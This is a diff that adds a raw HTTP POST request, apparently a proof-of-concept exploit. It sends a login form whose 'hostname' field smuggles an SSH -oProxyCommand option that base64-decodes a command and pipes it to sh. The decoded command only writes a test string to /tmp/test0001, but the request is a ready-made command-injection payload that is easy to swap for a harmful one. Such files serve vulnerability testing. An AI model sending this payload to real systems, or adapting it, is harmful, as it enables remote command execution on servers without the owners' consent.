@@ -1,0 +1,7 @@
+POST / HTTP/1.1
+Host: 10.10.3.128
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 125
+
+hostname=x+-oProxyCommand%3decho%09ZWNobyAnMTIzNDU2Nzg5MCc%2bL3RtcC90ZXN0MDAwMQo%3d|base64%09-d|sh}&username=111&password=222
